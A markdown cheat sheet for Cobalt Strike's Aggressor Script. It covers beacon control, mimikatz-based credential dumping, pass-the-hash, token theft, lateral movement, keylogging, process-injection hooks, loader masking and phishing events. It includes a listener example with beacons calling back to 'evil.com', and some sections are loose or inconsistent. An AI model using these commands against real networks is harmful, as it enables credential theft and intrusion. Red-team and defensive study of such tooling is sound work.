# Aggressor Script Cheat Sheet (Cobalt Strike)

This document serves as a comprehensive cheat sheet for Aggressor Script, the scripting language used to extend and customize Cobalt Strike. It is generated using PDF from:
https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf

You can find the up-to-date user guide here: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/agressor_script.htm

## Table of Contents

1.  [Introduction](#introduction)
2.  [Fundamentals](#fundamentals)
    *   [Comments](#comments)
    *   [Variables](#variables)
    *   [Arrays](#arrays)
    *   [Hashes (Dictionaries)](#hashes-dictionaries)
    *   [Operators and Whitespace](#operators-and-whitespace)
    *   [Control Flow](#control-flow)
    *   [Functions](#functions)
    *   [String Interpolation](#string-interpolation)
3.  [Data Model Interaction](#data-model-interaction)
    *   [Querying the Data Model](#querying-the-data-model)
    *   [Data Model Keys](#data-model-keys)
    *   [Helper Functions](#helper-functions)
4.  [Beacon Interaction](#beacon-interaction)
    *   [General Beacon Commands](#general-beacon-commands)
    *   [Process Manipulation](#process-manipulation)
    *   [File System Operations](#file-system-operations)
    *   [Networking](#networking)
    *   [Credential Access](#credential-access)
    *   [Lateral Movement](#lateral-movement)
    *   [Post-Exploitation Jobs](#post-exploitation-jobs-forkrun)
    *   [Aliases](#aliases)
    *   [Custom Commands](#custom-commands)
5.  [Listeners](#listeners)
    *   [Creating Listeners](#creating-listeners)
    *   [Listing Listeners](#listing-listeners)
    *   [Managing Listeners](#managing-listeners)
6.  [Beacon Object Files (BOFs)](#beacon-object-files-bofs)
    *   [BOF Overview](#bof-overview)
    *   [BOF Functions](#bof-functions)
    *   [BOF C API](#bof-c-api)
7.  [Process Injection Control](#process-injection-control)
    *   [The `PROCESS_INJECT_SPAWN` Hook](#the-process_inject_spawn-hook)
    *   [The `PROCESS_INJECT_EXPLICIT` Hook](#the-process_inject_explicit-hook)
8.  [User-Defined Reflective Loaders (UDRLs)](#user-defined-reflective-loaders-udrls)
    *   [UDRL Hooks](#udrl-hooks)
9.  [Malleable C2 Interaction](#malleable-c2-interaction)
10. [GUI Customization](#gui-customization)
    *   [Popup Menus](#popup-menus)
    *   [Custom Output and Events](#custom-output-and-events)
    *   [Dialogs](#dialogs)
    *   [Tabs and Visualizations](#tabs-and-visualizations)
11. [File Operations](#file-operations)
12. [Networking](#networking-1)
13. [String Manipulation](#string-manipulation)
14. [Other Useful Functions](#other-useful-functions)
15. [Event Handling](#event-handling)
    *   [Common Events](#common-events)
    *   [The `on` Keyword](#the-on-keyword)
16. [Aggressor Script Console](#aggressor-script-console)
17. [Headless Client (`agscript`)](#headless-client-agscript)
18. [OPSEC Considerations](#opsec-considerations)
19. [Reporting](#reporting)
20. [Hooks](#hooks-1)
21. [Keyboard Shortcuts](#keyboard-shortcuts)

---

## Introduction

Aggressor Script is a powerful scripting language built on top of Sleep.  It allows you to automate tasks, extend Cobalt Strike's functionality, create custom workflows, and tailor the tool to your specific needs. This cheat sheet provides a quick reference to the most important aspects of Aggressor Script.

## Fundamentals

### Comments

```cna
# This is a single-line comment
```

### Variables

```cna
$my_variable = "Hello";  # Scalar variable
$another_var = 123;
```
**Important:** *Whitespace is significant around operators in Aggressor Script.* `$x=1+2;` is **incorrect**. `$x = 1 + 2;` is correct.

### Arrays

```cna
@my_array = @("apple", "banana", "cherry");
$first_element = @my_array[0];  # Accessing elements (zero-based index)
```

### Hashes (Dictionaries)

```cna
%my_hash = %(name => "Alice", age => 30, city => "New York");
$name = %my_hash['name'];       # Accessing values by key
```

### Operators and Whitespace

Aggressor script requires that you use whitespace between operators.
```
$x=1+2; # this will not parse!!
$x = 1 + 2; #this will parse!!
```
### Control Flow

```cna
# If statement
if ($x > 10) {
    println("x is greater than 10");
}
else if ($x > 5) {
    println("x is greater than 5");
}
else {
    println("x is 5 or less");
}

# Foreach loop
foreach $item (@my_array) {
    println("Item: $item");
}

# While loop
$count = 0;
while ($count < 5) {
    println("Count: $count");
    $count++;
}
```

### Functions

```cna
sub my_function {
    # $1 is the first argument, $2 is the second, etc.
    # @_ is an array of all arguments
    local('$result'); # Declare local variables
    $result = $1 + $2;
    return $result;
}

$sum = my_function(5, 3);  # Call the function
println("Sum: $sum");
```

### String Interpolation

```cna
$name = "Bob";
println("Hello, $name!");       # Output: Hello, Bob!
println("1 + 2 is: " $+ (1 + 2));  # Output: 1 + 2 is: 3 (using $+ for concatenation)
```

## Data Model Interaction

Aggressor Script provides access to Cobalt Strike's data model, which stores information about targets, services, credentials, beacons, and more.

### Querying the Data Model

```cna
# Get all targets
@targets = &targets();

# Get all beacons
@beacons = &beacons();

# Get specific information about a beacon
$beacon_id = "1234";
$user = beacon_info($beacon_id, "user");

# List available data model keys
@keys = data_keys();

# Query a specific data model key
$data = data_query("beacons");
```

### Data Model Keys

Common data model keys include:

*   `beacons`
*   `targets`
*   `services`
*   `credentials`
*   `downloads`
*   `keystrokes`
*   `screenshots`
*   `sites`
*   `archives`
*	`applications`

### Helper Functions

Aggressor Script provides helper functions for accessing the data model, which are often more convenient than using `data_query` directly:

*   `&applications()`
*   `&archives()`
*   `&beacons()`
*   `&credentials()`
*   `&downloads()`
*   `&keystrokes()`
*   `&screenshots()`
*   `&services()`
*   `&sites()`
*   `&socks()`
*   `&targets()`

Example:

```cna
foreach $credential (credentials()) {
  println("User: " . $credential['user'] . ", Password: " . $credential['password']);
}
```

## Beacon Interaction

This section covers functions for interacting with Beacon sessions.  Remember to use `&binput` and `&btask` for *every* Beacon action to ensure proper logging and attribution.

### General Beacon Commands

| Function                          | Description                                                                                                          |
| :-------------------------------- | :------------------------------------------------------------------------------------------------------------------- |
| `&binput($bid, "command");`       | Sends a command *as if typed by the user*. Essential for logging.                                                  |
| `&btask($bid, "desc", "Tactic");` | Sends a task to Beacon with a description and optional MITRE ATT&CK tactic ID.                                     |
| `&bsleep($bid, $sec, $jitter);`    | Sets the Beacon's sleep time and jitter.                                                                            |
| `&bcheckin($bid)`                  | Forces a Beacon to check in immediately.                                                                             |
| `bclear($bid)`                     | Clear the queue of tasks.|
| `bexit($bid);`                    | Tells the Beacon to exit.                                                                                           |
|`bgetuid($bid)` | Prints the User ID of current token.|
| `bjobs($bid);`	|Lists running post-exploitation jobs.|
|`bjobkill($bid, $jobnumber)`|Kill apost-exploitation job.|
|`&beacon_info($bid,$2)`|Get metadata about a beacon session.|
|`beacon_ids()`|	Get the ID of all Beacons calling back to this Cobalt Strike team server.|

```cna
# Good OPSEC practice: Always use binput and btask!
alias whoami {
    binput($1, "shell whoami /all");  # Log the command as if typed by the user
    btask($1, "Running whoami", "T1033");    # Log the task with a description
    bshell($1, "whoami /all");      # Actually execute the command
}
```

### Process Manipulation

| Function                         | Description                                                                                               |
| :------------------------------- | :-------------------------------------------------------------------------------------------------------- |
| `&brun($bid, "command");`     | Executes a command *without* `cmd.exe`.                                                                    |
| `&bshell($bid, "command");`   | Executes a command via `cmd.exe`.                                                                            |
| `bkill($bid, $pid);`              | Kills a process.                                                                                           |
| `&bps($bid);`                 | Lists processes.                                                                                              |
| `&bppid($bid, $pid);`         | Sets the parent process ID for subsequent commands.                                                           |
|`&bgetprivs($bid, $privs)` |Attempt to enable privileges|
|`&bgetsystem($bid)`|Attempt to get SYSTEM token|
|`&bmimikatz($bid,$command, $pid?,$arch?)`|Run a mimikatz command|
|`&bmimikatz_small($bid,$command, $pid?,$arch?)`| Run mimikatz command(smaller internal build of mimikatz.)|
|`bdcsync($bid, $domain, $user?, $pid?, $arch?)`|Use mimikatz's dcsync command to pull a password hash from a domain controller.|
|`&blogonpasswords($bid, $pid?, $arch?)`|Dump in-memory credentials and NTLM hashes.Uses mimikatz|
|`&bhashdump($bid, $pid?, $arch?)`|Dump local account password hashes.|
|`bpsexec_command($bid, $target, $servicename, $commandtorun)`| Run a command on remote host.|
|`&bpassthehash($bid, $domain, $user, $hash,$pid?,$arch?)`| Pass the hash|
|`brunas($bid, $domain, $user, $password, $command)`|Run command as another user using their credentials.|
|`bspawnu($bid,$2,$3)`|Spawn a session under another process.|
|`&brev2self($bid)`|Drop current token.|
|`&bmake_token($bid, $domain, $username, $password)` / `&bloginuser`|Create a token for another user|
|`&bsteal_token($bid, $pid)`| Steal a token from process|
| `brun`                   | Executes a command *without* using `cmd.exe`.  Provides *no output* unless you specifically capture and send it. Use this for cleaner execution when you don't need the output in the Beacon console. | `brun($bid, "notepad.exe");`                                               | N/A          |
| `&bshell($bid, $cmd);`   | Executes a command via `cmd.exe`. Use `&binput` first.                                                                                                                                | `bshell($bid, "dir c:\\");`                                               | N/A          |

### File System Operations

| Function                         | Arguments                      | Description                                                                                          | Example                                                                    |
| :------------------------------- | :----------------------------- | :--------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------- |
| `&bls($bid, $path);`          | `$bid, $path`                  | Lists files and directories.                                                                        | `bls($bid, "c:\\users");`                                                |
| `&bdownload($bid, $remotepath);`| `$bid, $remotepath`            | Downloads a file from the Beacon.                                                                    | `bdownload($bid, "c:\\temp\\loot.txt");`                                 |
| `&bupload($bid, $localpath);` | `$bid, $localpath`             | Uploads a file to the Beacon.                                                                        | `bupload($bid, script_resource("evil.exe"));`                              |
| `&bupload_raw($bid, $remotepath, $data, $localpath?);`| `$bid, $remotepath, $data, $localpath`|Upload raw data| `bupload_raw($bid,"C:\\Windows\\Temp\\raw.exe",$data);` |
| `&bmkdir($bid, $path);`       | `$bid, $path`                  | Creates a directory.                                                                                 | `bmkdir($bid, "c:\\temp\\newdir");`                                       |
| `&brm($bid, $path);`          | `$bid, $path`                  | Removes a file or directory.                                                                        | `brm($bid, "c:\\temp\\evil.txt");`                                          |
| `&bcp($bid, $src, $dest);` | `$bid, $src, $dest`           | Copies a file.                                                                                        | `bcp($bid, "c:\\temp\\a.txt", "c:\\temp\\b.txt");`                        |
| `&bmv($bid, $src, $dest);` | `$bid, $src, $dest`           | Moves a file or directory.                                                                               | `bmv($bid, "c:\\temp\\a.txt", "c:\\users\\admin\\a.txt");`               |
| `&bcd($bid, $path)` | `$bid, $path`| Change directory | `bcd($bid, "C:\\Windows")`

### Networking

| Function                              | Arguments                                           | Description                                                                                                             | Example                                                                                |
| :------------------------------------ | :-------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------- |
| `&bportscan(...)`                      | `$bid, $targets, $ports, $method, $maxcon, $pid?, $arch?` | Performs a port scan.  See detailed argument descriptions in the previous table.                                       | `bportscan($bid, "192.168.1.0/24", "80,443", "arp", 100);`                            |
| `&bconnect($bid, $target, $port?);`      | `$bid, $target, $port`                                 | Connects to a waiting TCP Beacon.                                                                                          | `bconnect($bid, "192.168.1.102", 4444);`                                              |
| `&blink($bid, $target, $pipe?);`        | `$bid, $target, $pipe`                                | Links to an SMB Beacon.                                                                                                | `blink($bid, "192.168.1.102");`                                                    |
| `&bunlink($bid, $target, $sessionPID?)`   |`$bid, $target, $sessionPID?`| Unlink from a Beacon link.|`bunlink($bid,"192.168.1.102");`|
| `&brportfwd(...)`                     | `$bid, $bindport, $fwdhost, $fwdport`                   | Sets up a reverse port forward through the Beacon.                                                                      | `brportfwd($bid, 8080, "192.168.1.1", 80);`                                            |
| `&brportfwd_local(...)`               | `$bid, $bindport, $fwdhost, $fwdport`                  | Sets up a reverse port forward, tunneled through the *client*.                                                          | `brportfwd_local($bid, 8080, "192.168.1.1", 80);`                                      |
| `&brportfwd_stop($bid, $port)`          | `$bid, $port`                                           | Stops a reverse port forward.                                                                                                   |`brportfwd_stop($bid, 8080);`|
| `&bsocks($bid, $port)`                 |`$bid, $port`| Start SOCKS server.|`bsocks($bid,1080);`|
| `&bsocks_stop($bid)`                 |`$bid`|Stop SOCKS servers associated with specified Beacon.| `bsocks_stop($bid)`|
| `&bcovertvpn($bid, $iface, $ip, $mac?);` | `$bid, $iface, $ip, $mac`                           | Deploys a Covert VPN client.                                                                                           | `bcovertvpn($bid, "eth0", "192.168.1.1");`                                             |
|`bnet($bid, $command, $target?, $parameter?, $pid?, $arch?)`| `$bid, $command, $target?, $parameter?, $pid?, $arch?`|Run commands from the Beacon's network and host enumeration tool.|`bnet($bid,"localgroup",$target,"Administrators")`|
|`&bipconfig($bid, &callback)`| `$bid, &callback`|Get the network interfaces|`bipconfig($1, {blog($1, "IPConfig results: $+ $2");});`|

### Credential Access

| Function                          | Arguments                                      | Description                                                                                 | Example                                                                |
| :-------------------------------- | :--------------------------------------------- | :------------------------------------------------------------------------------------------ | :--------------------------------------------------------------------- |
| `&bloginuser(...)`             | `$bid, $domain, $user, $pass`                  | Creates a token for the specified user. Same as `make_token`.                                   | `bloginuser($bid, "DOMAIN", "user", "password");`                         |

### Lateral Movement

| Function                          | Arguments                                                                          | Description                                                                                                                                                                 | Example                                                                                          |
| :-------------------------------- | :--------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------- |
| `&bjump($bid, $method, $target, $listener);` | `$bid, $method, $target, $listener`                                           | Spawns a session on a remote target using a specified method (e.g., "psexec", "winrm").                                                                           | `bjump($bid, "psexec", "192.168.1.100", "my_listener");`                                        |
| `&bremote_exec(...)`              | `$bid, $method, $target, $command`                                                | Executes a command on a remote target.  Different methods are available (e.g., "wmi", "psexec").                                                                         | `bremote_exec($bid, "wmi", "192.168.1.100", "whoami");`                                          |
|`bpsexec_command($bid, $target, $servicename, $command)`|`$bid, $target, $servicename, $command`|Run command on remote host. Create service on remote hosts, start it, and clean it up| `bpsexec_command($1, "172.16.48.3", "ADMIN$\\foo.exe", "foo");` |

### Post-Exploitation Jobs (Fork&Run)

These commands spawn a temporary process and inject a capability into it.  This is often referred to as the "fork & run" pattern.

| Function             | Arguments                                    | Description                                                                                                                         | Example                                                                              |
| :------------------- | :------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------- |
| `&bkeylogger(...)` | `$bid, $pid?, $arch?`                        | Injects a keylogger. Can target a specific process or spawn a temporary one.                                                       | `bkeylogger($bid, 1234, "x86");`  or `bkeylogger($bid);`                              |
| `&bscreenshot(...)`| `$bid, $pid?, $arch?`                        | Takes a screenshot. Can target a specific process or spawn a temporary one.                                                      | `bscreenshot($bid, 1234, "x64");` or `bscreenshot($bid);`                           |
|`bscreenwatch($bid,$pid?,$arch?)`|`$bid,$pid?,$arch?`|Take screenshots periodically|`bscreenwatch($bid, 1234, "x64");` or  ``bscreenwatch($bid);`` |
| `&bdllspawn(...)`   | `$bid, $dllpath, $param, $desc, $blocktime` | Spawns a temporary process and injects a Reflective DLL.  *$blocktime is deprecated*                                                | `bdllspawn($bid, script_resource("mydll.dll"), "arg", "My DLL", 5000);`             |
| `&bexecute_assembly(...)`|`$bid, $assembly_path, $args`|Spawn a local .NET executable assembly as a Beacon post-exploitation job.|``bexecute_assembly($bid,script_resource("rubeus.exe"),"kerberoast");``|
|`&bpowerpick(...)`   | `$bid, "command"`                              | Executes a PowerShell command *without* powershell.exe.  Relies on Unmanaged PowerShell.                                        | `bpowerpick($bid, "Get-Process");`                                               |

### Aliases

Aliases create custom commands within the Beacon console.

```cna
alias myalias {
    # $0 is the full command (including arguments)
    # $1 is the Beacon ID
    # $2, $3, ... are the arguments
    binput($1, "Running myalias with args: $+ @_[1..-1]");  # Good OPSEC!
    bshell($1, "echo Alias called!  Args: $+ @_[1..-1]");
}

# Example usage in Beacon console:
# beacon> myalias arg1 "arg 2"
```

### Custom Commands
```cna
command customCommand{
 #Code to execute.
}
```

## Listeners

### Creating Listeners

Use `listener_create_ext` to create listeners.  This function takes a listener name, payload type, and a dictionary of options.

```cna
listener_create_ext("my_http", "windows/beacon_http/reverse_http",
    %(host => "192.168.1.100", port => 80, beacons => "evil.com"));
```

### Listing Listeners

```cna
@listeners = listeners();        # All listeners (across all team servers)
@local_listeners = listeners_local();  # Only listeners on the current team server
```
`listeners_stageless` to get listeners across all team servers this client is connected to.

### Managing Listeners
|Function|Arguments|Description|
|---|---|---|
|`listener_delete($name)`|`$name`|Stop and remove listener|
|`listener_restart($name)`|`$name`|Restart a listener.|
|`listener_describe($listener, $target?)`|`$listener, $target?`| Describe a listener.|

## Beacon Object Files (BOFs)

BOFs are compiled C programs that run *within* the Beacon process, providing a low-footprint way to extend Beacon's capabilities.

### BOF Overview
Lightweight, compiled C programs.
*   Run *inside* the Beacon process.
*   Cleaned up after execution.
*   Avoid the fork&run pattern.
*   Ideal for small, quick tasks.

### BOF Functions

| Function                                   | Arguments                      | Description                                                                                      |
| :----------------------------------------- | :----------------------------- | :----------------------------------------------------------------------------------------------- |
| `&beacon_inline_execute($bid, $data, $entry, $args);` | `$bid, $data, $entry, $args` | Executes a BOF.  `$data` is the BOF content, `$entry` is the entry point (usually "go"), `$args` is packed arguments. |
| `&bof_pack($bid, $format, ...);`          | `$bid, $format, ...`            | Packs arguments for a BOF according to the format string (e.g., "zi" for a zero-terminated string and an integer). |
| `bof_extract($data)`                       |`$data`                   |  Extract the executable code for a reflective loader from a Beacon Object File (BOF).|

### BOF C API
See documentation.

## Process Injection Control

Cobalt Strike 4.4+ introduced hooks for customizing process injection.

### The `PROCESS_INJECT_SPAWN` Hook

This hook lets you define how the "fork & run" process injection technique is implemented.

```cna
set PROCESS_INJECT_SPAWN {
    # $1 = Beacon ID
    # $2 = memory injectable DLL (position-independent code)
    # $3 = true/false ignore process token
    # $4 = x86/x64 - memory injectable DLL arch

    # ... your custom injection logic here ...
	local('$barch $handle $data $args $entry');
	# Set the architecture for the beacon's session
	$barch = barch($1);

	# read in the injection BOF based on barch
	warn("read the BOF: inject_spawn. $+ $barch $+ .o");
	$handle = openf(script_resource("inject_spawn. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	# pack our arguments needed for the BOF
	$args = bof_pack($1, "sb", $3, $2);
	btask($1, "Process Inject using fork and run");

	# Set the entry point based on the dll's arch
	$entry = "go $+ $4";
	beacon_inline_execute($1, $data, $entry, $args);

   # Let the caller know the hook was implemented.
  return 1;
}
```

### The `PROCESS_INJECT_EXPLICIT` Hook

This hook lets you define how *explicit* process injection (into a specific, existing process) is implemented.

```cna
set PROCESS_INJECT_EXPLICIT {
    # $1 = Beacon ID
    # $2 = memory injectable DLL (position-independent code)
    # $3 = the PID to inject into
    # $4 = offset to jump to
    # $5 = x86/x64 - memory injectable DLL arch

    # ... your custom injection logic here ...
		local('$barch $handle $data $args $entry');
	# Set the architecture for the beacon's session
	$barch = barch($1);

	# read in the injection BOF based on barch
	warn("read the BOF: inject_explicit. $+ $barch $+ .o");
	$handle = openf(script_resource("inject_explicit. $+ $barch $+ .o"));
	$data = readb($handle, -1);
	closef($handle);

	# pack our arguments needed for the BOF
	$args = bof_pack($1, "iib", $3, $4, $2);

	btask($1, "Process Inject using explicit injection into pid $3");

	# Set the entry point based on the dll's arch
	$entry = "go $+ $5";
	beacon_inline_execute($1, $data, $entry, $args);
  # Let the caller know the hook was implemented.
  return 1;
}
```

## User-Defined Reflective Loaders (UDRLs)
Allows you to use customized reflective loaders for beacon payloads.

### UDRL Hooks
|Hook|Description|
|---|---|
|`BEACON_RDLL_GENERATE`|Hook to implement basic Reflective Loader replacement.|
|`BEACON_RDLL_SIZE`|Hook called when preparing beacons and allows the user to configure more than 5 KBspace for their reflectiveloader(upto100KB).|
|`BEACON_RDLL_GENERATE_LOCAL`|Hook used to implement advanced Reflective Loader replacement.|

## Malleable C2 Interaction

Malleable C2 profiles significantly impact Beacon's behavior.  Aggressor Script *can* interact with some profile settings, but generally, you configure these in the profile itself.  Key areas:

*   **`process-inject` block:** Controls process injection behavior (memory allocation, permissions, techniques).
*   **`stage` block:**  Controls how Beacon is loaded into memory, including PE header modifications and in-memory obfuscation.
*   **`post-ex` block:**  Controls aspects of post-exploitation DLLs (e.g., `spawnto`, `obfuscate`).

## GUI Customization

### Popup Menus

```cna
popup beacon_bottom {
    item "&Say Hello" {
        blog($1, "Hello from the popup menu!");
    }

    separator(); # Add a visual separator

    menu "&Submenu" {
        item "&Option 1" {
            # ...
        }
        item "&Option 2" {
            # ...
        }
    }
}
```

Common popup hooks:

*   `beacon`, `beacon_top`, `beacon_bottom`:  Beacon context menu.
*   `targets`: Target table context menu.
*   `services`: Services table context menu.
*   `credentials`: Credentials table context menu.
*   `help`: Help menu
*	`reporting`: Reporting Menu.
*	`view`: View Menu
*	`attacks`: Attacks Menu
*	`aggressor`: CobaltStrike Menu

### Custom Output and Events
The `set` keyword defines how to format an event and present its output.
```cna
set EVENT_SBAR_LEFT {
    return "[". tstamp(ticks()). "] ". mynick();
}
```

### Dialogs

```cna
sub my_callback {
    local('$dialog $values');
    ($dialog, $button, $values) = @_; # Unpack arguments
    println("Button pressed: $button");
    println("Input value: " . $values['my_input']);
    # ... process the input ...
}

$dialog = dialog("My Dialog", %(my_input => "Default Value"), \&my_callback);
dialog_description($dialog, "This is a sample dialog.");
drow_text($dialog, "my_input", "Enter text:");  # Text field
drow_checkbox($dialog, "my_checkbox", "Check me:", "Check this box"); # Checkbox
drow_combobox($dialog,"my_combobox", "Options:",@("Option 1","Option 2","Option 3")); #Combobox
dbutton_action($dialog, "OK");          # "OK" button (calls the callback)
dbutton_help($dialog, "https://www.example.com/help"); # Help Button
dialog_show($dialog);
```

### Tabs and Visualizations

```cna
# Create a simple label component (Java Swing)
$label = [new javax.swing.JLabel: "Hello, world!"];

# Add it as a tab
addTab("My Tab", $label, "This is a custom tab");

# Add it as a visualization
addVisualization("My Visualization", $label);

# Switch to the visualization
# showVisualization("My Visualization");
```

## File Operations

```cna
# Open a file for writing
$handle = openf(">output.txt");

# Write data to the file
writeb($handle, "This is some text.\n");

# Read the entire file
$all_data = readb($handle, -1);

# Close the file
closef($handle);

# Get the full path to a file in the script's directory
$script_path = script_resource("my_data.txt");
```

## Networking
* localip() - Get the IP address associated with the teamserver.
```cna
println("I am: " . localip());
```

## String Manipulation
See above table.

## Other Useful Functions

| Function              | Arguments      | Description                                                                  | Example                                  |
| :-------------------- | :------------- | :--------------------------------------------------------------------------- | :--------------------------------------- |
| `ticks()`             |                | Returns the current system time in milliseconds.                              | `` `$now = ticks();` ``                  |
| `&url_open("url")`  | `"url"`        | Opens a URL in the default browser.                                             | `` `url_open("https://www.example.com");` `` |
| `&users()`            |                | Returns an array of usernames connected to the team server.                   | `` `foreach $user (users()) { println($user); }` `` |
|`say($message)`|`$message`|Post a public message in the event log.|`say("Hello")`|
| `sleep $time`        |`$time`      |  Make current thread sleep  | ``sleep 5000;``               |
|`encode($code, $encoder, $arch)`| `$code, $encoder, $arch`|Obfuscate a position independent blob of code with an encoder.|``encode($1, "xor", "x86");``|
|`gunzip($1)`|`$compressed`|Decompress a string(GZIP)|`gunzip($compressed_string);`|
|`gzip($string)`| `$string`|GZIP a string.|`gzip($string);`|
|`pref_get($pref, $default?)`|`$pref, $default?`| Grabs a string value from Cobalt Strike preferences.|`pref_get("foo.string","bar");`|
|`pref_set($pref, $value)`|`$pref, $value`|Set value in Cobalt Strike preferences.|`pref_set("foo.string","bar")`|
|`pref_get_list($pref)`|`$pref`|Grabs a list value from cobalt strike preferences.| `@foo= pref_get_list("foo.list")`|
|`pref_set_list($1,$2)`|`$1=preference name, $2=array of values`| Stores a list value into Cobalt Strike preferences.| `pref_set_list("foo.list", @("a","b","c"));`|
|`host_delete($ipv4oripv6)`|`$ipv4oripv6`|Delete a host from the targets model.|`host_delete(hosts())`|
|`host_info($1, $2?)`|`$1=host IPv4orIPv6, $2=key`| Get information about a target.|`host_info($1)`|
| `host_update($1,$2,$3,$4,$5)`|`$1=host, $2=DNS,$3=OS,$4=version,$5=note`| Add or update a host in targets model.|`host_update("192.168.1.103","DC","Windows",10.0);`|
|`highlight($datamodel,$rows,$accent)`|`$1=datamodel,$2=array,$3=accenttype`|Insert an accent(color highlight)into Cobalt Strike's datamodel|`highlight("credentials", @creds, "good")`|
|`action($message)`|`$message`|Post a public action message to event log| `action("dances!")`|
|`pe_mask_string`| | Mask string in Beacon DLL content |See documentation|
|`pe_mask_section`||Mask data in Beacon DLL content|See documentation|
|`pe_patch_code`|| Patch code in Beacon DLL|See documentation|
|`pe_remove_rich_header`||Remove rich header from Beacon DLL|See documentation|
|`pe_set_compile_time_with_long`|| Set compile time in Beacon DLL(long)|See documentation|
|`pe_set_compile_time_with_string`||Set compile time in Beacon DLL(string)| See documentation|
|`pe_set_export_name`||Set the export name in Beacon DLL content|See documentation|
|`pe_set_long`||Place a long value at a specified location|See documentation|
|`pe_set_short`|| Place a short value at specified location.|See documentation|
|`pe_set_string`||Place a string value at specified location|See documentation|
|`pe_set_stringz`||Place a string at specified location and adds a zero terminator.|See documentation|
|`pe_set_value_at`||Sets a long value based on location resolved by name from PEMap|See documentation|
|`pe_stomp`||Set a string to null characters|See documentation|
|`pe_update_checksum`||Update the checksum in Beacon DLL|See documentation|
|`pedump`||Parse an executable Beacon into a map of the PE Header|See documentation|
|`insert_menu("hook",$1)`|`$hook, $1`|Bring menus associated with a popuphook into the current menu tree.|`insert_menu("beacon_bottom",$1)`|
|`popup_clear($hook)`|`$hook`|Remove all popup menus associated with the current menu.|`popup_clear("help");`|
|`&site_host(...)`||Host content on Cobalt Strike's webserver.| `site_host(localip(), 80, "/", "Hello World!", "text/plain", "Hello WorldPage", false);`|
|`&site_kill(...)`||Remove a site from Cobalt Strike's webserver|`site_kill(80, "/");`|
|`tokenToEmail($token)`| `$token`|Convert a phishing token to email address|`tokenToEmail($token)`|

## Event Handling

### Common Events
|Event|Arguments|Description|
|---|---|---|
|`*`| `$1`=original event name, `...`=arguments to the event|Fires whenever *any* Aggressor Script event fires.|
|`beacon_checkin`|`$1`=beacon ID, `$2`=message text, `$3`=timestamp| Fired when a Beacon checkin acknowledgement is posted to console.|
|`beacon_error`|`$1`=beacon ID, `$2`=message text, `$3`=timestamp|Fired when an error is posted to a Beacon's console.|
|`beacon_indicator`|`$1`=beacon ID, `$2`=user responsible,`$3`=message text, `$4`=timestamp|Fired when an indicator of compromise notice is posted to a Beacon's console.|
|`beacon_initial`|`$1`=beacon ID|Fired when a beacon calls home for the first time.|
|`beacon_initial_empty`|`$1`=beacon ID|Fired when a *DNS* Beacon calls home for the first time (no metadata yet).|
|`beacon_input`|`$1`=beaconID, `$2`=user responsible, `$3`=message text, `$4`=timestamp|Fired when an input message is posted to a Beacon's console.|
|`beacon_mode`|`$1`=beacon ID, `$2`=message text, `$3`=timestamp|Fired when a mode change acknowledgement is posted to console.|
|`beacon_output`|`$1`=beacon ID, `$2`=message text, `$3`=timestamp|Fired when output is posted to console.|
|`beacon_output_alt`|`$1`=beacon ID, `$2`=message text, `$3`=timestamp|Fired when (alternate) output is posted to console.|
|`beacon_output_jobs`|`$1`=beacon ID, `$2`=job output, `$3`=timestamp| Fired when jobs output is sent to console.|
|`beacon_output_ls`|`$1`=beacon ID, `$2`=ls output, `$3`=timestamp|Fired when ls output is sent to console.|
|`beacon_output_ps`|`$1`=beacon ID, `$2`=ps output, `$3`=timestamp| Fired when ps output is sent to console.|
|`beacon_tasked`|`$1`=beacon ID, `$2`=message text, `$3`=timestamp| Fired when a task acknowledgement is posted to console.|
|`beacons`|`$1`=array of dictionary objects| Fired when the team server sends over fresh info on all of our Beacons|
|`disconnect`| |Fired when this Cobalt Strike client becomes disconnected from team server|
|`event_action`|`$1`=who message is from,`$2`=message contents,`$3`=time message posted|Fired when user performs action in event log.|
|`event_beacon_initial`|`$1`=message contents, `$2`=message time|Fired when initial beacon message is posted to event log|
|`event_join`|`$1`=who joined, `$2`=time message posted|Fired when a user connects to the team server.|
|`event_newsite`|`$1`=who setup,$2`=new site contents, `$3`=time message posted|Fired when a new site message is posted to event log|
|`event_notify`|`$1`=message contents, `$2`= time message posted|Fired when message from team server posted to event log.|
|`event_nouser`|`$1`=who is not present, `$2`= time message posted|Fired when current Cobalt Strike client tries to interact with a user who is not connected.|
|`event_private`|`$1`= who message from,`$2`=who message directed to, `$3`=message contents,`$4`=time message posted.|Fired when a private message is posted to event log.|
|`event_public`|`$1`=who message is from, `$2`=contents, `$3`=time message posted|Fired when a public message is posted to event log.|
|`event_quit`|`$1`=who left, `$2`= time message posted|Fired when someone disconnects from team server.|
|`heartbeat_X`| |Fired every X, where X is 1s,5s,10s,15s,30s,1m,5m,10m,15m,20m,30m,or60m.|
|`keylogger_hit`|`$1`=external visitor address,`$2`=reserved, `$3`= logged keystrokes, `$4`= phishing token|Fired when there are new results reported to web server via cloned site keystroke logger|
|`keystrokes`|`$1`= dictionary of keystrokes|Fired when Cobalt Strike receives keystrokes.|
|`profiler_hit`|`$1`=visitor ext. address, `$2`=de-cloaked int. address, `$3`=visitor's User-Agent, `$4`=dictionary containing apps,$5`= phishing token|Fired when there are new results reported to system profiler.|
|`ready`| | Fired when Cobalt Strike client is connected to team server and ready to act.|
|`screenshots`|`$1`= dictionary of screenshot|Fired when Cobalt Strike receives a screenshot.|
|`sendmail_done`|`$1`=campaign ID|Fired when a phishing campaign completes.|
|`sendmail_post`|`$1`=campaign ID, `$2`=email we're sending to, `$3`=phish status, `$4`=message from mail server| Fired after a phish is sent|
|`sendmail_pre`|`$1`=campaign ID, `$2`=email we're sending to|Fired before a phish is sent.|
|`sendmail_start`|`$1`=campaign ID,`$2`=number of targets, `$3`=local attachment path, `$4`=bounce to address, `$5`=mail server string, `$6`=email subject, `$7`=local path to phishing template, `$8`=URL to embed|Fired when new phishing campaign kicks off.|
|`ssh_checkin`|`$1`=session ID, `$2`= message text, `$3`= time message occurred|Fired when SSH client checkin acknowledgement is posted to an SSH console.|
